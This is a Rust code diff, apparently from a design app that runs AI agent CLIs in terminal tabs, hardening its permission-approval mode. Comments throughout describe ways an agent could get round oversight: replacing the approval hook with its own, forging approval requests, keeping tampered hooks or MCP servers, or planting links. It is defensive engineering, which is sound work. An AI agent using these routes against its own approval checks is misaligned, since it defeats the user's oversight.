-            Some(cmd) => self.spawn_tab_with_registration(preset, file_path, Some(cmd), None, false, None, false),
+            Some(cmd) => {
+                self.refresh_permission_mode_from_disk();
+                let mode = self.permission_mode;
+                self.spawn_tab_with_registration(preset, file_path, Some(cmd), None, false, None, false, mode)
+            }
             None => self.spawn_tab(preset, file_path),
         }
     }
 
+    /// Starts the tab. `mode` is the permission mode `command` was built for, read once by the caller; it is what the
+    /// session files, the environment and the tab use too, so none of them can follow a later reading of the saved mode.
     #[allow(clippy::too_many_arguments)]
     fn spawn_tab_with_registration(
         &mut self,
@@ -2915,21 +3005,44 @@ impl TerminalState {
         is_resumed: bool,
         custom_title: Option<String>,
         register_new_entry: bool,
+        mode: crate::agent_permissions::AgentPermissionMode,
     ) -> Result<usize, String> {
-        self.refresh_permission_mode_from_disk();
+        // The agent's working folder must be one Studio made: a link or foreign folder there stops the tab, with the reason.
+        if let Err(e) = crate::agent_session_files::ensure_session_dir(&self.session_dir) {
+            let message = crate::agent_session_files::start_failure_message(preset.tab_title(), &e);
+            self.status_msg = Some(message.clone());
+            return Err(message);
+        }
+        self.permission_mode = mode;
         let id = self.next_tab_id.max(1);
         self.next_tab_id = id + 1;
         let run_seq = self.next_run_seq.max(1);
         self.next_run_seq = run_seq + 1;
         self.active_run_id = format!("{}-{}-{}", self.session_id, id, run_seq);
-        let _ = crate::agent_session_files::ensure_session_dir(&self.session_dir);
-        if !matches!(preset, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp) {
-            self.reset_agent_run(file_path);
+        // Grok and Antigravity load their project config, hooks and MCP servers included, from the session folder, as the user.
+        let exact = match (preset, mode) {
+            (AgentCliPreset::Grok, PermissionMode::Ask) => Some(crate::agent_session_files::ExactProjectConfig::Grok),
+            (AgentCliPreset::Antigravity, PermissionMode::Ask) => Some(crate::agent_session_files::ExactProjectConfig::Antigravity),
+            _ => None,
+        };
+        let provisioned = if !matches!(preset, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp) {
+            self.reset_agent_run_exact(file_path, exact)
         } else {
-            self.provision_session_agent_files(file_path);
+            self.provision_session_agent_files(file_path)
+        };
+        // Gemini CLI, Grok and Antigravity load the files Studio just rewrote by themselves. In Ask mode, files that could not be
+        // rewritten, or do not read back as written, or an entry that is not Studio's and could not be moved aside, may be a copy an
+        // agent kept (hooks and servers included): the tab does not start.
+        if let (AgentCliPreset::Gemini | AgentCliPreset::Grok | AgentCliPreset::Antigravity, PermissionMode::Ask, Some(e)) = (preset, mode, &provisioned) {
+            let message = crate::agent_session_files::start_failure_message(preset.tab_title(), e);
+            self.set_aside_note = None;
+            self.status_msg = Some(message.clone());
+            return Err(message);
         }
         let mut env = self.session_env();
         env.tab_session_uuid = session_uuid.clone();
+        // A Gemini tab in Ask mode reads its status hooks from a private file, written before the tab starts.
+        env.gemini_system_defaults = crate::gemini_status_hooks::prepare_for_tab(&self.session_dir, id, mode, preset).map(|path| path.display().to_string());
         let cmd_override = command.map(|c| {
             let cmd = build_agent_shell_cmd(&default_shell_program(), c);
             #[cfg(test)]
@@ -2956,10 +3069,13 @@ impl TerminalState {
                 tab.is_resumed = is_resumed;
                 tab.spawned_command = command.map(str::to_string);
                 tab.permission_mode = self.permission_mode;
+                // Antigravity has no permission hook. A Gemini tab with no hooks file is not on this list: its waits start from the
+                // dialog on its screen (`gemini_dialog`), never from words in its output.
                 tab.pty_waiting_heuristic.store(
                     self.permission_mode == crate::agent_permissions::AgentPermissionMode::Ask && preset == AgentCliPreset::Antigravity,
                     std::sync::atomic::Ordering::Release,
                 );
+                tab.gemini.hooks = env.gemini_system_defaults.is_some();
                 if let Some(title) = custom_title {
                     tab.title = title;
                 }
@@ -3005,7 +3121,12 @@ impl TerminalState {
                     self.refresh_tab_usage(self.active_tab);
                 }
                 self.viewport_focused = true;
-                self.status_msg = Some(format!("Spawned {} ({} · {})", preset.tab_title(), self.doc_name, self.current_page_name));
+                let spawned = format!("Spawned {} ({} · {})", preset.tab_title(), self.doc_name, self.current_page_name);
+                // What was moved out of the CLI's way is said in the same line: a plain status line set earlier would be overwritten here.
+                self.status_msg = Some(match self.set_aside_note.take() {
+                    Some(note) => format!("{spawned}. {note}"),
+                    None => spawned,
+                });
                 if let Some((held_title, held_prompt)) = self.pending_prompt.take() {
                     if !has_queued {
                         self.dispatch_figma_ai_prompt(&held_title, &held_prompt, file_path);
@@ -3014,6 +3135,9 @@ impl TerminalState {
                 Ok(self.active_tab)
             }
             Err(e) => {
+                self.set_aside_note = None;
+                // The tab never started, so nothing will read the hooks file written for it.
+                crate::gemini_status_hooks::remove_tab_file(&self.session_dir, id);
                 self.status_msg = Some(format!("PTY error: {e}"));
                 Err(e)
             }
@@ -3065,13 +3189,22 @@ impl TerminalState {
 
     fn resume_session_entry(&mut self, entry_clone: &crate::agent_sessions::SessionEntry, file_path: Option<&Path>) -> Result<usize, String> {
         self.refresh_permission_mode_from_disk();
+        let mode = self.permission_mode;
         let preset =
             crate::agent_sessions::preset_from_cli_name(&entry_clone.cli).ok_or_else(|| format!("Unsupported CLI '{}' in sessions.json", entry_clone.cli))?;
-        let cmd_str = crate::agent_permissions::build_resume_command_for_mode(entry_clone, self.codex_cwd_scoped, self.agy_cwd_scoped, self.permission_mode)
+        let cmd_str = crate::agent_permissions::build_resume_command_for_mode(entry_clone, self.codex_cwd_scoped, self.agy_cwd_scoped, mode)
             .ok_or_else(|| format!("CLI '{}' does not support safe session resume", entry_clone.cli))?;
 
-        let tab_idx =
-            self.spawn_tab_with_registration(preset, file_path, Some(&cmd_str), entry_clone.session_id.clone(), true, Some(entry_clone.title.clone()), false)?;
+        let tab_idx = self.spawn_tab_with_registration(
+            preset,
+            file_path,
+            Some(&cmd_str),
+            entry_clone.session_id.clone(),
+            true,
+            Some(entry_clone.title.clone()),
+            false,
+            mode,
+        )?;
         let new_tab_id = self.tabs[tab_idx].id as u64;
         if let Some(entry) = self.session_registry.find_entry_mut(entry_clone.tab_id, entry_clone.session_id.as_deref()) {
             entry.tab_id = new_tab_id;
@@ -3129,7 +3262,10 @@ impl TerminalState {
         if idx < self.tabs.len() {
             let mut removed = self.tabs.remove(idx);
             let _ = removed.child.kill();
-            Self::withdraw_tab_approvals(&self.session_dir, &mut removed);
+            Self::withdraw_tab_approvals(&mut removed);
+            if removed.spawn_preset == AgentCliPreset::Gemini {
+                crate::gemini_status_hooks::remove_tab_file(&self.session_dir, removed.id);
+            }
             if let Some(entry) = self.session_registry.find_entry_mut(removed.id as u64, removed.session_uuid.as_deref()) {
                 if entry.status == crate::agent_sessions::SessionEntryStatus::Active {
                     entry.status = crate::agent_sessions::SessionEntryStatus::Exited;
@@ -3142,7 +3278,6 @@ impl TerminalState {
             } else if self.tabs.is_empty() {
                 self.active_tab = 0;
                 self.picker_open = true;
-                crate::agent_permissions::withdraw_pending_requests(&self.session_dir);
             }
             self.sync_active_tab_approvals();
         }
@@ -3177,17 +3312,16 @@ impl TerminalState {
 
         // Channel 1: Scoped live-spec.json
         let live_spec = self.live_spec_path.clone();
-        if let Ok(meta) = std::fs::metadata(&live_spec) {
-            if let Ok(mtime) = meta.modified() {
-                let is_newer = match self.last_watched_mtime {
-                    Some(prev) => mtime > prev,
-                    None => true,
-                };
-                if is_newer {
-                    self.last_watched_mtime = Some(mtime);
-                    self.status_msg = Some(format!("Hot-applied {} (<50ms)", live_spec.display()));
-                    actions.push(TerminalAction::ApplySpecFile(live_spec));
-                }
+        // The time comes from the file as it is opened: a link or a FIFO the agent planted has none, so it is no spec.
+        if let Some(mtime) = spec_mtime(&live_spec) {
+            let is_newer = match self.last_watched_mtime {
+                Some(prev) => mtime > prev,
+                None => true,
+            };
+            if is_newer {
+                self.last_watched_mtime = Some(mtime);
+                self.status_msg = Some(format!("Hot-applied {} (<50ms)", live_spec.display()));
+                actions.push(TerminalAction::ApplySpecFile(live_spec));
             }
         }
 
@@ -3212,9 +3346,12 @@ impl TerminalState {
             actions.push(TerminalAction::ApplyLiveLog(lines));
         }
 
-        // Channel 3: Append-only agent-events.jsonl written by Claude, Grok, and Antigravity hooks (`#683`).
+        // Channel 3: Append-only agent-events.jsonl written by Claude, Grok, Antigravity and Gemini hooks (`#683`).
         // Each routed status change also drives that tab's turn ledger (`#677`) for CLIs without turn marks.
-        let has_eligible_tabs = self.tabs.iter().any(|t| matches!(t.spawn_preset, AgentCliPreset::Claude | AgentCliPreset::Grok | AgentCliPreset::Antigravity));
+        let has_eligible_tabs = self
+            .tabs
+            .iter()
+            .any(|t| matches!(t.spawn_preset, AgentCliPreset::Claude | AgentCliPreset::Grok | AgentCliPreset::Antigravity | AgentCliPreset::Gemini));
         let records = self.event_stream.poll(has_eligible_tabs);
         // Tabs whose status left `WaitingForInput` for `Working`/`Done` in this poll: an approval answered in the
         // CLI itself (not the in-panel card) withdraws that tab's stale approval requests below (`#656`).
@@ -3226,6 +3363,7 @@ impl TerminalState {
                 .enumerate()
                 .map(|(idx, t)| crate::agent_turn_status::TabAttributionInfo {
                     idx,
+                    tab_id: t.id,
                     preset: t.spawn_preset,
                     is_alive: t.is_alive(),
                     session_uuid: t.session_uuid.clone(),
@@ -3309,45 +3447,34 @@ impl TerminalState {
             }
         }
 
-        // Channel 4: Per-tab approvals/ directories written by Claude PreToolUse approval hook (#656)
+        // A Gemini tab's wait follows the confirmation dialog on its screen, after the hook records above have had their say.
+        self.sync_gemini_dialogs();
+
+        // Channel 4: each tab's folder in the Studio-private approval channel, written by Claude's PermissionRequest hook (#656).
+        // No folder an agent can write is polled: a request file there is the agent's own doing, not the hook's.
         let now_secs = crate::agent_sessions::unix_timestamp_secs();
-        let root_approvals = crate::agent_permissions::approvals_dir(&self.session_dir);
-        let root_polled = if root_approvals.is_dir() {
-            crate::agent_permissions::poll_approvals_in_dir(&root_approvals, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS)
-        } else {
-            Vec::new()
-        };
 
         if self.tabs.is_empty() {
-            self.pending_approvals = root_polled;
+            self.pending_approvals.clear();
         } else {
-            let active_idx = self.active_tab.min(self.tabs.len().saturating_sub(1));
             let mut next_per_tab: Vec<Vec<crate::agent_permissions::ApprovalRequest>> = self
                 .tabs
                 .iter_mut()
                 .map(|tab| {
-                    tab.approvals_dir = crate::agent_permissions::tab_approvals_dir(&self.session_dir, tab.id);
-                    if tab.approvals_dir.is_dir() {
-                        crate::agent_permissions::poll_approvals_in_dir(&tab.approvals_dir, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS)
-                    } else {
-                        Vec::new()
+                    tab.approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&self.session_dir, tab.id);
+                    match tab.approvals_dir.as_deref().filter(|dir| dir.is_dir()) {
+                        Some(dir) => crate::agent_permissions::poll_approvals_in_dir(dir, now_secs, crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS),
+                        None => Vec::new(),
                     }
                 })
                 .collect();
-
-            for req in root_polled {
-                let owner_idx = self.tabs.iter().position(|t| t.pending_approvals.iter().any(|r| r.id == req.id)).unwrap_or(active_idx);
-                if !next_per_tab[owner_idx].iter().any(|r| r.id == req.id) {
-                    next_per_tab[owner_idx].push(req);
-                }
-            }
 
             for (idx, tab) in self.tabs.iter_mut().enumerate() {
                 let had_pending = !tab.pending_approvals.is_empty();
                 let mut polled = std::mem::take(&mut next_per_tab[idx]);
                 polled.sort_by(|a, b| (a.timestamp, &a.id).cmp(&(b.timestamp, &b.id)));
                 if tabs_left_waiting.contains(&idx) && polled.is_empty() {
-                    Self::withdraw_tab_approvals(&self.session_dir, tab);
+                    Self::withdraw_tab_approvals(tab);
                 } else {
                     tab.pending_approvals = polled;
                 }
@@ -3385,7 +3512,7 @@ impl TerminalState {
         actions.extend(crate::agent_stop::poll_stop_sequences(self, designos_doc::now_ms()));
         // Channel 5: `agent-status.json` -> `done` releases the frames this run flagged `in_progress` (`#592`).
         let status_file = self.session_dir.join("agent-status.json");
-        if let Ok(raw_status) = std::fs::read_to_string(&status_file) {
+        if let Some(raw_status) = crate::agent_session_files::read_session_text(&status_file) {
             if let Some(parsed) = parse_agent_status_payload(raw_status.trim()) {
                 let is_done = matches!(parsed, AgentTabStatus::Done);
                 if is_done && !self.last_agent_status_done {
@@ -3527,7 +3654,8 @@ impl TerminalState {
                 if let Ok(mut parser) = tab.parser.lock() {
                     parser.process("\r\n[design:os] Agent exited — this tab no longer accepts input. Open a new tab to continue.\r\n".as_bytes());
                 }
-                Self::withdraw_tab_approvals(&self.session_dir, tab);
+                tab.screen_rev.fetch_add(1, std::sync::atomic::Ordering::Release);
+                Self::withdraw_tab_approvals(tab);
                 if let Ok(mut st) = tab.agent_status.lock() {
                     if matches!(*st, AgentTabStatus::WaitingForInput(_)) {
                         *st = AgentTabStatus::Idle;
@@ -4396,10 +4524,12 @@ fn build_agent_shell_cmd(shell_bin: &str, agent_cli: &str) -> CommandBuilder {
 /// makes it discover this plugin for that session only, leaving the user's global agy config untouched.
 fn write_agy_session_plugin(session_dir: &Path, mcp_config_bytes: &[u8]) -> std::io::Result<()> {
     let plugin_dir = session_dir.join(".agents").join("plugins").join("designos");
-    let manifest = br#"{"name":"designos"}"#;
-    atomic_write_session_file(&plugin_dir.join("plugin.json"), manifest)?;
+    atomic_write_session_file(&plugin_dir.join("plugin.json"), AGY_PLUGIN_MANIFEST)?;
     atomic_write_session_file(&plugin_dir.join("mcp_config.json"), mcp_config_bytes)
 }
+
+/// The manifest of the `designos` plugin of an Antigravity session (`plugin.json`).
+const AGY_PLUGIN_MANIFEST: &[u8] = br#"{"name":"designos"}"#;
 
 /// Publishes the session's MCP server config as Gemini CLI's project settings at
 /// `<session_dir>/.gemini/settings.json` plus `<session_dir>/.gemini/trustedFolders.json`
@@ -4414,27 +4544,28 @@ fn write_agy_session_plugin(session_dir: &Path, mcp_config_bytes: &[u8]) -> std:
 /// launched in `Ask` when the mode changes later: the file is shared by the window's tabs and rewritten on every sync.
 /// The folder itself stays trusted in both modes: without it Gemini ignores the project settings and never starts the
 /// server, and `TRUST_FOLDER` adds no allow rule.
-pub fn write_gemini_session_config(session_dir: &Path, mcp_config: &serde_json::Value) {
+///
+/// Gemini loads both files by itself, the server and its hooks included, so each one is read back through the folder's handle
+/// after it is written. A write that fails (an agent made `.gemini` read-only), or a file that does not read back as written,
+/// is an error: a copy an agent kept would run for good.
+pub fn write_gemini_session_config(session_dir: &Path, mcp_config: &serde_json::Value) -> std::io::Result<()> {
     let _argv = build_gemini_mcp_add_argv(mcp_config);
     let mut gemini_cfg = mcp_config.clone();
     // `designos.enabled_tools` is read by `designos-mcp`; Gemini's settings file only takes the server entry.
     if let Some(obj) = gemini_cfg.as_object_mut() {
         obj.remove("designos");
     }
-    if let Ok(bytes) = serde_json::to_vec_pretty(&gemini_cfg) {
-        let settings_path = session_dir.join(".gemini").join("settings.json");
-        let _ = atomic_write_session_file(&settings_path, &bytes);
-    }
+    let settings = serde_json::to_vec_pretty(&gemini_cfg).map_err(invalid_data)?;
 
     let mut trusted = serde_json::Map::new();
     trusted.insert(session_dir.display().to_string(), serde_json::Value::String("TRUST_FOLDER".to_string()));
     if let Ok(canon) = session_dir.canonicalize() {
         trusted.insert(canon.display().to_string(), serde_json::Value::String("TRUST_FOLDER".to_string()));
     }
-    if let Ok(bytes) = serde_json::to_vec_pretty(&serde_json::Value::Object(trusted)) {
-        let trusted_path = session_dir.join(".gemini").join("trustedFolders.json");
-        let _ = atomic_write_session_file(&trusted_path, &bytes);
-    }
+    let trusted = serde_json::to_vec_pretty(&serde_json::Value::Object(trusted)).map_err(invalid_data)?;
+
+    crate::agent_session_files::write_session_file_verified(&session_dir.join(".gemini").join("settings.json"), &settings)?;
+    crate::agent_session_files::write_session_file_verified(&session_dir.join(".gemini").join("trustedFolders.json"), &trusted)
 }
 
 /// Builds the project-scoped `gemini mcp add` argv (`#679` §3 rule 4) using only flags
@@ -4488,7 +4619,14 @@ fn toml_key(k: &str) -> String {
 /// Grok 1.0.62 has no per-session MCP flag; it merges the project layer of its cwd, so the tab is
 /// started with `--cwd <session_dir>` and the user's `~/.grok/config.toml` is never written.
 fn write_grok_session_config(session_dir: &Path, mcp_config: &serde_json::Value) -> std::io::Result<()> {
-    let Some(servers) = mcp_config.get("mcpServers").and_then(|v| v.as_object()) else { return Ok(()) };
+    let Some(toml) = grok_session_config_toml(mcp_config) else { return Ok(()) };
+    atomic_write_session_file(&session_dir.join(".grok").join("config.toml"), toml.as_bytes())
+}
+
+/// The text of Grok's project config for `mcp_config`: its `mcpServers` and nothing else (no plugin, no permission rule). `None`
+/// when `mcp_config` has no `mcpServers`.
+fn grok_session_config_toml(mcp_config: &serde_json::Value) -> Option<String> {
+    let servers = mcp_config.get("mcpServers").and_then(|v| v.as_object())?;
     let mut toml = String::new();
     for (name, server) in servers {
         let key = toml_key(name);
@@ -4511,7 +4649,7 @@ fn write_grok_session_config(session_dir: &Path, mcp_config: &serde_json::Value)
         }
         toml.push('\n');
     }
-    atomic_write_session_file(&session_dir.join(".grok").join("config.toml"), toml.as_bytes())
+    Some(toml)
 }
 
 #[cfg(test)]
@@ -4547,19 +4685,75 @@ fn invalid_data(e: serde_json::Error) -> std::io::Error {
     std::io::Error::new(std::io::ErrorKind::InvalidData, e)
 }
 
-/// Writes `mcp-config.json`, `hooks.json`, `SKILL.md`, `AGENTS.md`, and runtime-specific plugin/hook
-/// files for `job` into `job.session_dir` (`#690` §6).
+/// Writes the MCP config an Ask-mode Claude starts its servers from into the private channel folder `private_dir`: the
+/// session's `mcp_config` with the `designos` server's `DESIGNOS_MCP_CONFIG` pointing at this copy (so the server reads
+/// its enabled tools from it, not from the session folder), owner-only, rewritten at every sync. A failure is reported
+/// and leaves no copy or the previous one: Claude then starts no server, or the one Studio wrote last, and never one
+/// from a file in the session folder.
+fn write_private_claude_mcp_config(private_dir: &Path, mcp_config: &serde_json::Value) {
+    let path = private_dir.join(crate::agent_approval_channel::MCP_CONFIG_FILE_NAME);
+    let mut private_config = mcp_config.clone();
+    if let Some(slot) = private_config.pointer_mut("/mcpServers/designos/env/DESIGNOS_MCP_CONFIG") {
+        *slot = serde_json::Value::String(path.display().to_string());
+    }
+    let written = serde_json::to_vec_pretty(&private_config)
+        .map_err(invalid_data)
+        .and_then(|bytes| crate::agent_approval_channel::write_owner_only_file(&path, &bytes, false));
+    if let Err(e) = written {
+        eprintln!("design:os studio: could not write Claude's MCP config to {}: {e}", path.display());
+    }
+}
+
+/// [`write_session_agent_files`] without what it says about the entries it moved aside.
 pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files::SnapshotJob) -> std::io::Result<()> {
+    write_session_agent_files(job).map(|_| ())
+}
+
+/// Writes `mcp-config.json`, `hooks.json`, `SKILL.md`, `AGENTS.md`, and runtime-specific plugin/hook
+/// files for `job` into `job.session_dir` (`#690` §6). When a tab of Grok or Antigravity is starting in Ask mode (`exact_project_config`),
+/// what the CLI loads from the folder is made exactly Studio's first, and a sentence on what was moved aside comes back. A failure
+/// after entries were moved carries that sentence too, so the line about it names both.
+pub(crate) fn write_session_agent_files(job: &crate::agent_session_files::SnapshotJob) -> std::io::Result<Option<String>> {
+    let mut moved_aside = None;
+    write_session_agent_files_noting(job, &mut moved_aside).map_err(|e| match moved_aside {
+        Some(note) => crate::agent_session_files::with_set_aside_note(e, note),
+        None => e,
+    })
+}
+
+/// [`write_session_agent_files`], which leaves in `moved_aside` what it said about the entries it moved aside as soon as it knows,
+/// before a later write can fail.
+fn write_session_agent_files_noting(job: &crate::agent_session_files::SnapshotJob, moved_aside: &mut Option<String>) -> std::io::Result<Option<String>> {
     let mcp_bin = designos_mcp_binary();
     let workspace_dir = session_workspace_dir(job.file_path.as_deref());
     let mcp_config_path = job.session_dir.join("mcp-config.json");
 
+    // Ask mode: Claude's MCP config, hooks and skill go to a folder only Studio writes (made first, as the MCP config below
+    // is copied into it). Claude starts the servers of its `--mcp-config` file as commands, and reads the hooks of its
+    // `--settings` file as commands too, so neither may be a file the agent can write. When the folder is not there (no
+    // private data folder, or it cannot be made private) nothing is installed: Claude starts with no MCP server and the
+    // inline settings `{}`.
+    let private_dir = if job.ask_mode {
+        match crate::agent_approval_channel::prepare_channel_dir(&job.session_dir) {
+            Ok(dir) => Some(dir),
+            Err(e) => {
+                eprintln!("design:os studio: in-panel approvals are off for this session, Claude will ask in its terminal: {e}");
+                None
+            }
+        }
+    } else {
+        None
+    };
+
     // The default (every tool) is never written down: an absent `designos` key means "all", so a tool a later
     // build adds is on for sessions that survive an update. A user-edited `enabled_tools` list is kept across
     // each page or selection sync, together with the `known_tools` snapshot that lets new tools be switched on.
-    let existing_config = std::fs::read_to_string(&mcp_config_path).ok();
+    let existing_config = crate::agent_session_files::read_session_text(&mcp_config_path);
     let custom_tools = designos_mcp::rules::reconcile_designos_block(existing_config.as_deref());
 
+    // The server's environment holds ids and paths, and no document or page name: every CLI loads this config by itself,
+    // and `designos-mcp` reads neither name (the tab's shell still has `DESIGNOS_DOC_NAME` and `DESIGNOS_TARGET_PAGE_NAME`).
+    // `DESIGNOS_FILE` is the document's path on disk, which `designos-mcp` needs.
     let mut mcp_config = serde_json::json!({
         "mcpServers": {
             "designos": {
@@ -4577,8 +4771,6 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
                     "DESIGNOS_LIVE_SPEC": job.live_spec_path.display().to_string(),
                     "DESIGNOS_CONTEXT_JSON": job.context_json_path.display().to_string(),
                     "DESIGNOS_TARGET_PAGE_ID": job.current_page_id.to_string(),
-                    "DESIGNOS_TARGET_PAGE_NAME": job.current_page_name,
-                    "DESIGNOS_DOC_NAME": job.doc_name,
                     "DESIGNOS_FILE": job.file_path.as_ref().map(|p| p.display().to_string()).unwrap_or_default()
                 }
             }
@@ -4589,9 +4781,34 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
     }
     let bytes = serde_json::to_vec_pretty(&mcp_config).map_err(invalid_data)?;
     atomic_write_session_file(&mcp_config_path, &bytes)?;
-    write_agy_session_plugin(&job.session_dir, &bytes)?;
-    write_gemini_session_config(&job.session_dir, &mcp_config);
-    write_grok_session_config(&job.session_dir, &mcp_config)?;
+    // The Ask-mode tab of Grok or Antigravity that is about to start gets its project config made exactly Studio's first, so that
+    // is the error the tab reports; the plain writes of that CLI's files below are then skipped.
+    let exact = if job.ask_mode { job.exact_project_config } else { None };
+    let status_path = job.session_dir.join("agent-status.json");
+    let grok_hooks_bytes = serde_json::to_vec_pretty(&session_hooks_settings(&status_path, None, None)).map_err(invalid_data)?;
+    let agy_hooks_bytes = serde_json::to_vec_pretty(&agy_session_hooks(&status_path)).map_err(invalid_data)?;
+    let set_aside_note = match exact {
+        Some(ExactProjectConfig::Grok) => {
+            let config = grok_session_config_toml(&mcp_config).unwrap_or_default();
+            crate::agent_project_config::make_grok_config_exact(&job.session_dir, config.as_bytes(), &grok_hooks_bytes)?
+        }
+        Some(ExactProjectConfig::Antigravity) => {
+            crate::agent_project_config::make_agy_config_exact(&job.session_dir, &agy_hooks_bytes, AGY_PLUGIN_MANIFEST, &bytes)?
+        }
+        None => None,
+    };
+    moved_aside.clone_from(&set_aside_note);
+    if exact != Some(ExactProjectConfig::Antigravity) {
+        write_agy_session_plugin(&job.session_dir, &bytes)?;
+    }
+    // Every other file is written whatever this one's result is; it is reported last, and an Ask-mode Gemini tab refuses to start on it.
+    let gemini_config = write_gemini_session_config(&job.session_dir, &mcp_config);
+    if exact != Some(ExactProjectConfig::Grok) {
+        write_grok_session_config(&job.session_dir, &mcp_config)?;
+    }
+    if let Some(dir) = &private_dir {
+        write_private_claude_mcp_config(dir, &mcp_config);
+    }
 
     let page_context = page_context_json(&job.session_id, &job.doc_name, job.file_path.as_deref(), job.current_page_id, &job.current_page_name);
     // Claude's reply to a prompt hook: the page as `additionalContext`, nothing that could block the prompt.
@@ -4607,8 +4824,17 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
 
     let bootstrap_reply_path = job.session_dir.join("bootstrap-context-reply.json");
     let delivered_marker_path = job.session_dir.join(format!("bootstrap.delivered.{}", job.bootstrap_run_id));
-    let status_path = job.session_dir.join("agent-status.json");
-    let approve_script_path = job.ask_mode.then(|| crate::agent_permissions::write_approval_hook_script(&job.session_dir));
+    // Ask mode: the hook script and the hooks file that names it go to the Studio-private channel folder, the script first.
+    // Claude reads that file (not one in the session folder, which the agent can write), so the agent cannot swap the
+    // approval handler for its own. When the folder is not there (no private data folder, or it cannot be made private)
+    // nothing is installed: Claude starts with the inline settings `{}` and asks in its own terminal prompt.
+    let approve_script_path = private_dir.as_deref().and_then(|dir| match crate::agent_permissions::install_hook_script(dir, &job.session_dir) {
+        Ok(path) => Some(path),
+        Err(e) => {
+            eprintln!("design:os studio: in-panel approvals are off for this session, Claude will ask in its terminal: {e}");
+            None
+        }
+    });
     let transcript_capture_path = job.session_dir.join(crate::agent_usage::CLAUDE_TRANSCRIPT_META_FILENAME);
     let claude_hooks = session_hooks_settings_with_approval(
         &status_path,
@@ -4617,20 +4843,31 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
         Some(&transcript_capture_path),
     );
     let hooks_bytes = serde_json::to_vec_pretty(&claude_hooks).map_err(invalid_data)?;
-    atomic_write_session_file(&job.session_dir.join("hooks.json"), &hooks_bytes)?;
+    if job.ask_mode {
+        if let Some(dir) = &private_dir {
+            let hooks_path = dir.join(crate::agent_approval_channel::HOOKS_FILE_NAME);
+            if let Err(e) = crate::agent_approval_channel::write_owner_only_file(&hooks_path, &hooks_bytes, false) {
+                eprintln!("design:os studio: could not write Claude's hooks to {}: {e}", hooks_path.display());
+            }
+        }
+        // An earlier build wrote the hooks, approval handler included, into the session folder; nothing reads them now.
+        crate::agent_permissions::remove_stale_session_hooks(&job.session_dir);
+    } else {
+        atomic_write_session_file(&job.session_dir.join("hooks.json"), &hooks_bytes)?;
+    }
 
-    let grok_hooks_bytes = serde_json::to_vec_pretty(&session_hooks_settings(&status_path, None, None)).map_err(invalid_data)?;
-    atomic_write_session_file(&job.session_dir.join(".grok").join("hooks").join("designos-status.json"), &grok_hooks_bytes)?;
-
-    let agy_hooks_bytes = serde_json::to_vec_pretty(&agy_session_hooks(&status_path)).map_err(invalid_data)?;
-    atomic_write_session_file(&job.session_dir.join(".agents").join("hooks.json"), &agy_hooks_bytes)?;
+    if exact != Some(ExactProjectConfig::Grok) {
+        atomic_write_session_file(&job.session_dir.join(".grok").join("hooks").join("designos-status.json"), &grok_hooks_bytes)?;
+    }
+    if exact != Some(ExactProjectConfig::Antigravity) {
+        atomic_write_session_file(&job.session_dir.join(".agents").join("hooks.json"), &agy_hooks_bytes)?;
+    }
 
     // The session `SKILL.md` carries the rules pack for the tools this session enables.
     let rules_body = session_rules_pack(custom_tools.as_ref().map(|custom| &custom.enabled));
     let selection_spec_path = job.session_dir.join("selection.spec.json");
+    // The skill is loaded by the CLIs by themselves and holds no document or page name (see `format_session_skill_md`).
     let skill_md = designos_mcp::rules::format_session_skill_md(
-        &job.doc_name,
-        &job.current_page_name,
         &job.session_id,
         job.current_page_id,
         &job.live_canvas_path,
@@ -4643,18 +4880,40 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
     );
     atomic_write_session_file(&job.session_dir.join("SKILL.md"), skill_md.as_bytes())?;
     atomic_write_session_file(&job.session_dir.join(".claude/skills/designos-studio/SKILL.md"), skill_md.as_bytes())?;
+    // An Ask-mode Claude loads no project skills (`--setting-sources user`), so the same skill is also written, as a plugin,
+    // to the private folder its `--plugin-dir` names. Skip-mode tabs keep reading the copy above.
+    if job.ask_mode {
+        if let Some(plugin_dir) = private_dir.as_deref().map(|dir| dir.join(crate::agent_approval_channel::CLAUDE_PLUGIN_DIR_NAME)) {
+            if let Err(e) = crate::agent_permissions::write_claude_plugin(&plugin_dir, skill_md.as_bytes()) {
+                eprintln!("design:os studio: could not write Studio's skill for Claude to {}: {e}", plugin_dir.display());
+            }
+        }
+    }
     atomic_write_session_file(&job.session_dir.join(".agents/skills/designos-studio/SKILL.md"), skill_md.as_bytes())?;
     // Codex, Grok, Antigravity, Gemini CLI, and OpenCode read `AGENTS.md` / `GEMINI.md` from their cwd (the session dir).
     atomic_write_session_file(&job.session_dir.join("AGENTS.md"), skill_md.as_bytes())?;
-    atomic_write_session_file(&job.session_dir.join("GEMINI.md"), skill_md.as_bytes())
+    atomic_write_session_file(&job.session_dir.join("GEMINI.md"), skill_md.as_bytes())?;
+    // The CLI whose tab is starting has had every one of its files checked above; another CLI's Gemini settings are not its concern.
+    if exact.is_some() {
+        return Ok(set_aside_note);
+    }
+    gemini_config.map(|()| None)
 }
 
 /// Shell command that appends one wrapped hook record to `<session_dir>/agent-events.jsonl` (`#683` §3.1)
 /// and updates `agent-status.json` for legacy status readers.
 fn status_hook_command(status_path: &Path, event: &str, state: &str) -> String {
+    status_hook_command_for_tab(status_path, event, state, None)
+}
+
+/// [`status_hook_command`] whose record also names tab `tab` (Gemini CLI's hooks; `None` gives the plain command).
+pub(crate) fn status_hook_command_for_tab(status_path: &Path, event: &str, state: &str, tab: Option<usize>) -> String {
     let events_path = status_path.parent().map(|p| p.join("agent-events.jsonl")).unwrap_or_else(|| status_path.with_file_name("agent-events.jsonl"));
-    let append_cmd = crate::agent_turn_status::event_append_command(&events_path, event);
-    format!("{append_cmd}; printf '{{\"state\":\"{state}\",\"run_id\":\"%s\"}}\\n' \"${{DESIGNOS_AGENT_RUN_ID:-}}\" > '{}'", status_path.display())
+    let append_cmd = crate::agent_turn_status::event_append_command_for_tab(&events_path, event, tab);
+    format!(
